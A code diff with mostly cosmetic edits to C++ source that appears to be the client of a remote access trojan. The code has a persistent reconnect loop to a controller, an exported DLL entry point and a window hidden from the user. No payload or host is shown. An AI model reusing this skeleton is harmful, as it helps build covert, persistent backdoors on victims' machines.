@@ -1,15 +1,15 @@
 #include "stdafx.h"
-
-#include "..\\common\\ClientSocket.h"
+#include "windows.h"
+#include "..//common//ClientSocket.h"
 #include "MyKernelManager.h"
 #include "login.h"
 
 #define DE
-#include "..\\..\\debug.h"
+#include "..//..//debug.h"
 
 #if _MSC_VER < 1600
-	#pragma comment(linker,"/FILEALIGN:0x200 /OPT:NOWIN98")
-	#pragma comment(lib,"msvcrt.lib")
+#pragma comment(linker, "/FILEALIGN:0x200 /OPT:NOWIN98")
+#pragma comment(lib, "msvcrt.lib")
 #endif
 
 HMODULE hSelf = NULL;
@@ -57,7 +57,7 @@ DWORD WINAPI ConnectThread(LPVOID lp)
 	CClientSocket socketClient;
 	BYTE bBreakError = NOT_CONNECT;
 
-	while (1)
+	while (true)
 	{
 		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
 		{
@@ -96,10 +96,6 @@ DWORD WINAPI ConnectThread(LPVOID lp)
 			Sleep(500);
 		} while (dwIOCPEvent != WAIT_OBJECT_0);
 	}
-
-	SetErrorMode(0);
-
-	return 0;
 }
 
 extern "C" __declspec(dllexport) DWORD WINAPI RoutineMain(LPVOID lp)
@@ -113,13 +109,11 @@ extern "C" __declspec(dllexport) DWORD WINAPI RoutineMain(LPVOID lp)
 		memcpy(&SysInfo, lp, sizeof(DLL_INFO));
 	}
 
-	while (1)
+	while (true)
 	{
 		ConnectThread(lp);
 		Sleep(500);
 	}
-
-	return 0;
 }
 
 #ifdef EXEBUILD
@@ -141,7 +135,7 @@ int WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 		NULL,
 		GetModuleHandleW(0),
 		NULL
-		);
+	);
 
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
